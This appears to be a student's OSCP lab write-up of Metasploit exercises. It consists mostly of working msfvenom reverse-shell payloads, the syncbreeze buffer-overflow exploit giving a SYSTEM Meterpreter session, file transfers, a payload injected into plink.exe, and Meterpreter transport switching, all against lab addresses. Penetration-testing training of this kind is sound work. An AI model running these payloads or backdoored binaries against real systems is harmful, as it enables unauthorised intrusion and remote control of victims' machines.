22.3.7.1

# 22.3.7.1.1. Create a staged and a non-staged Linux binary payload to use on your Kali system.

Non-Staged payload
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f exe -o nonStaged_linux_x86_shellReverseTcp_192.168.119.214_443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of exe file: 73802 bytes
Saved as: nonStaged_linux_x86_shellReverseTcp_192.168.119.214_443.exe
```

Staged payload
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ msfvenom -p linux/x86/shell/reverse_tcp lhost=192.168.119.214 lport=443 -f exe -o staged_linux_x86_shell_reverseTcp_192.168.119.214_443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of exe file: 73802 bytes
Saved as: staged_linux_x86_shell_reverseTcp_192.168.119.214_443.exe
```


# 22.3.7.1.2. Setup a Netcat listener and run the non-staged payload. Does it work?

Yes it works!

Setup a netcat listener
```plaintext
kali@kali:~$ sudo nc -lnvp 443
[sudo] password for kali: 
listening on [any] 443 ...
```

Run the payload executable.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ wine nonStaged_linux_x86_shellReverseTcp_192.168.119.214_443.exe 

```

The netcat listener caught a shell
![87b578ab3826f01e2abd15458f172dc2.png](3d4a6f40c2794c08bee6bb83699c01e6.png)


# 22.3.7.1.3. Setup a Netcat listener and run the staged payload. Does it work?

It makes a connection, but the reverse shell does not work.

Setup a netcat listener
```plaintext
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
```

Run the payload executable
```
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ wine staged_linux_x86_shell_reverseTcp_192.168.119.214_443.exe 
0009:err:seh:setup_exception_record stack overflow 780 bytes in thread 0009 eip 0023105c esp 00231024 stack 0x230000-0x231000-0x330000
```
![96cba011f3980f6f1a4bfb1425de8b78.png](a08579b035b743f9b03ff0fdcf4c43b9.png)


# 22.3.7.1.4. Get a Meterpreter shell on your Windows system. Practice file transfers.

Ensure syncbreeze is running on the Windows client.
![09201c36498da560e53496599a7d4545.png](0d98dbedb1364e9db0f1125d898b86e5.png)

Open metasploit -> use the syncbreeze_bof exploit, and set meterpreter payload for it
```plaintext
msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(windows/http/syncbreeze_bof) > set rhosts 192.168.214.10
rhosts => 192.168.214.10
msf5 exploit(windows/http/syncbreeze_bof) > set lport 4444
lport => 4444
msf5 exploit(windows/http/syncbreeze_bof) > show options

Module options (exploit/windows/http/syncbreeze_bof):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.214.10   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.119.214  yes       The local listener hostname
   LPORT     4444             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/syncbreeze_bof) > exploit
                                                                                                                             
[*] Started HTTP reverse handler on http://192.168.119.214:4444                                                              
[*] Automatically detecting target...                                                                                        
[*] Target is 10.0.28                                                                                                        
[*] Sending request...                                                                                                       
[*] http://192.168.119.214:4444 handling request from 192.168.214.10; (UUID: ouwvub3b) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.214:4444 -> 192.168.214.10:49850) at 2020-10-11 14:56:29 -0400

meterpreter > sysinfo
Computer        : CLIENT251
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x86
System Language : en_US
Domain          : corp
Logged On Users : 11
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
![5c38b80d0f792b97b1be8339abdb048c.png](f9eddc22ebf2420d83f877b5d3ca78b1.png)


Now practice file transfers
```
meterpreter > upload /usr/share/windows-resources/binaries/exe2bat.exe c:\\users\admin
[*] uploading  : /usr/share/windows-resources/binaries/exe2bat.exe -> c:\usersadmin
[*] Uploaded 52.00 KiB of 52.00 KiB (100.0%): /usr/share/windows-resources/binaries/exe2bat.exe -> c:\usersadmin
[*] uploaded   : /usr/share/windows-resources/binaries/exe2bat.exe -> c:\usersadmin
meterpreter > download c:\\windows\system32\\notepad.exe /tmp/notepad.exe
[-] stdapi_fs_stat: Operation failed: The system cannot find the path specified.
meterpreter > download c:\\windows\\system32\\notepad.exe /tmp/notepad.exe
[*] Downloading: c:\windows\system32\notepad.exe -> /tmp/notepad.exe
[*] Downloaded 231.00 KiB of 231.00 KiB (100.0%): c:\windows\system32\notepad.exe -> /tmp/notepad.exe
[*] download   : c:\windows\system32\notepad.exe -> /tmp/notepad.exe
meterpreter > upload /usr/share/windows-resources/binaries/vncviewer.exe c:\\users\offsec
[*] uploading  : /usr/share/windows-resources/binaries/vncviewer.exe -> c:\usersoffsec
[*] Uploaded 356.00 KiB of 356.00 KiB (100.0%): /usr/share/windows-resources/binaries/vncviewer.exe -> c:\users
[*] uploaded   : /usr/share/windows-resources/binaries/vncviewer.exe -> c:\usersoffsec
meterpreter > download c:\\windows\\system32\\nmspaint.exe /tmp/mspaint.exe
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > download c:\\windows\\system32\\mspaint.exe /tmp/mspaint.exe
[*] Downloading: c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 1.00 MiB of 6.23 MiB (16.05%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 2.00 MiB of 6.23 MiB (32.11%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 3.00 MiB of 6.23 MiB (48.16%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 4.00 MiB of 6.23 MiB (64.21%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 5.00 MiB of 6.23 MiB (80.26%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 6.00 MiB of 6.23 MiB (96.32%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] Downloaded 6.23 MiB of 6.23 MiB (100.0%): c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
[*] download   : c:\windows\system32\mspaint.exe -> /tmp/mspaint.exe
```

# 22.3.7.1.5. Inject a payload into **plink.exe**. Test it on your Windows system.

Inject a payload into plink.exe
```
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```
![3519f7fdbbbc21c5336e7b6f86083e03.png](ea5180c5148b4a389ca21bc22308345e.png)

We already have a meterpreter session open from the previous question and practiced uploading and downloading. Upload the binary to the Windows client.
```
meterpreter > upload /home/kali/gitWorkspace/pwk/oscpExercises/22_metasploitFramework/shell_reverse_msf_encoded_embedded.exe c:\\users\\administrator\\desktop
```
![5ae4294e45600974522b46a6d7131433.png](00e1a6bd6afc4a9189d1abe4e988890b.png)

Start a netcat listener on port 443
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ sudo nc -lnvp 443
listening on [any] 443 ...
```
![229df7185d117333738f9337b0713aae.png](373d1b2a404c4df4a0f357afdcf51b84.png)

Spawn a system shell
`meterpreter > shell`
![976939d2ca452a660acda40266c48069.png](39680adcdcc6460a96f42d0d3b82d4c8.png)
`c:\users\administrator\Desktop>shell_reverse_msf_encoded_embedded.exe shell_reverse_msf_encoded_embedded.exe`
![10506c1dae2895088919aab3c38e7c53.png](2e36783b651645dd8cffffc79db96dba.png)

We have a caught a shell on our Kali netcat listener
![94f1e2a61f45a4ac93ab051d9e745a83.png](24da08e086c94138a74c5f863ce384a3.png)



# 22.3.7.1.6. Create an executable file running a Meterpreter payload and execute it on your Windows system.

Create the Meterpreter payload executable. We use a non-staged Meterpreter payload
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ msfvenom -p windows/meterpreter_reverse_http lhost=192.168.119.214 lport=443 -f exe -o nonStaged_windows_meterpreterReverseHttp_192.168.119.214_443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 177241 bytes
Final size of exe file: 252416 bytes
Saved as: nonStaged_windows_meterpreterReverseHttp_192.168.119.214_443.exe
```
![dfa67575b6ff9dfa75112eaa021cbcf1.png](ff58942aff79405e91388b5d905e25ba.png)

Upload the binary to the Windows client via netcat
![5bf9379ed33e887f5f4e3ecc2a3b34da.png](d0c89bf0c3524688a337e067dec4f3dc.png)
![bc685e007d22e4567fef84ce4be654cf.png](d9ae8f452efc4f78983aa84f438722cc.png)


Instead of a netcat listener, use the Metasploit multi/handler module. We must tell it to expect a payload windows/meterpreter_reverse_http
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ sudo msfconsole -q
[*] Starting persistent handler(s)...
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter_reverse_http
payload => windows/meterpreter_reverse_http
msf5 exploit(multi/handler) > set lhost 192.168.119.214
lhost => 192.168.119.214
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://192.168.119.214:443
```
![1abcd137a9d89ce7692b212800146eb8.png](6376bf2c816441d9851cba866f6839af.png)

Run the binary on Windows client
![88a057adf352860a87509088f5c4b258.png](82830f8d431341899dfb5b32a116601b.png)

Notice we have a shell on the multi/handler
![a4c0ebd7d562602f979e5132b9cf1276.png](4051ab34ac894c2883823bc2d8ab5a77.png)


# 22.3.7.1.7. After establishing a Meterpreter connection, setup a new transport type and change to it.

From the meterpreter prompt, list the transport protocols, then add a new transport protocol for reverse_tcp
`transport list`
`transport add -t reverse_tcp -l 192.168.119.214 -p 5555`
`transport list`
![802ba77cb1fbcfe7de0ccec4adad70b3.png](6661892019cf47e69dc463736e8ca401.png)

Send the current session to background
`background`
![e0bcb3f3351d1ce3beaaf8f85a1bf8f1.png](10e733e7f9ef486b9b9b8ac0ff30a922.png)

Set the payload for reverse_tcp and run the exploit
`set payload windows/meterpreter/reverse_tcp`
`set lhost 192.168.119.214`
`set lport 5555`
`exploit -j`
![87d57ab5203067f98714a0e222e703e5.png](7948c3d0d7644a6e969fb73fa582f308.png)

View the sessions, and select the one to interact with (in this example, #1). Issue the transport command, then interact with the other session (#2)
`sessions -l`
`sessions -i 1`
`transport next`
`sessions -i 2`
`shell`
`whoami`
`ipconfig`
![6e5f7b7da14a121d062c3a6105efd091.png](ec94dd370ac34499afb735165afdbcb0.png)